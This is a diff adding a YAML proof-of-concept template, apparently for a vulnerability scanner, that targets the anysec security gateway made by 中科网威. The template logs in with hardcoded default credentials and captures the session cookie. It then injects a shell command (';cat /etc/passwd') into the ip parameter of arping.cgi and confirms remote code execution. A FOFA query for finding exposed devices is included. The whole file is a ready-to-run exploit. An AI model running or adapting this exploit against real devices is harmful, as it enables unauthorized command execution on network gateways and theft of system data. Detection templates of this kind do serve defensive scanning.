@@ -1,0 +1,27 @@
+id: poc-yaml-netpower-anysec-security-gateway-arping-rce
+info:
+  name: 中科网威anysec安全网关 arping 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 中科网威anysec安全网关
+  fofa: app="中科网威-anysec"
+requests:
+- method: POST
+  path: /login.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tasknum=1&username=admin&passwd=anysec&OK.x=0&OK.y=0
+  expression: status_code == 302 && contains(headers,"CGISID=")
+  output:
+  - regex_match(headers,"CGISID=(?P<cookie>.*?);")
+- method: POST
+  path: /cgi-bin/system/arping.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: CGISID={{.cookie}}
+  data: moduleid=150&tasknum=1&ip=127.0.0.1;cat%20/etc/passwd&interface=wan0&count=4&sip=8.8.8.8&x=58&y=16
+  expression: status_code == 200 && contains(body,"Arping Test") && contains(body,"root:")
+    && contains(body,"/bin")
+variables: {}
+transport: http
